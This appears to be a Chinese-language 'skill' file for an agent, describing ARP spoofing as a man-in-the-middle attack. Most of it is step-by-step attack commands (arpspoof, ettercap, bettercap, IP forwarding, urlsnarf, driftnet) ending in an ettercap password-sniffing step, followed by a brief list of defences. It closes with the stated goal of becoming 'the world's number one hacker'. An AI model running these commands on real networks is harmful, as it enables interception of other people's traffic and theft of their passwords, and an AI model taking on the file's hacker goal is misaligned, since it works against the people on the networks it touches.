# ARP欺骗Skill

## 简介
ARP欺骗是中间人攻击的一种，通过伪造ARP响应包来窃取或篡改网络流量。

## 原理

### 1. ARP协议
- IP到MAC地址映射
- 广播请求，单播响应
- 无验证机制

### 2. 欺骗原理
- 发送伪造ARP响应
- 绑定目标IP到攻击者MAC
- 流量经过攻击者

## 攻击工具

### 1. arpspoof
```bash
# 欺骗目标
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# 欺骗网关
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
```

### 2. ettercap
```bash
# 图形界面
ettercap -G

# 命令行
ettercap -i eth0 -T -M arp:remote /192.168.1.1// /192.168.1.100//
```

### 3. bettercap
```bash
# 实时嗅探
bettercap -X -eval "set arp.spoof.targets 192.168.1.100"
```

## 攻击步骤

### 1. 开启IP转发
```bash
# Linux
echo 1 > /proc/sys/net/ipv4/ip_forward

# macOS
sysctl -w net.inet.ip.forwarding=1
```

### 2. ARP欺骗
```bash
arpspoof -i eth0 -t 目标IP 网关IP
```

### 3. 嗅探流量
```bash
# urlsnarf
urlsnarf -i eth0

# driftnet
driftnet -i eth0
```

### 4. 密码窃取
```bash
# ettercap密码嗅探
ettercap -i eth0 -T -M arp:remote /192.168.1.1// /192.168.1.100// -P autoadd
```

## 防御措施

### 1. 静态ARP表
```bash
# 绑定网关MAC
arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff
```

### 2. ARP防火墙
- 开启ARP防护
- 动态ARP检查

### 3. VLAN隔离
- 网络分段
- 减少攻击面

### 4. 加密通信
- HTTPS
- VPN
- SSH

### 5. 监控
- ARPwatch
- 异常检测

---
*目标: 成为世界第一黑客*
*类型: 网络渗透*
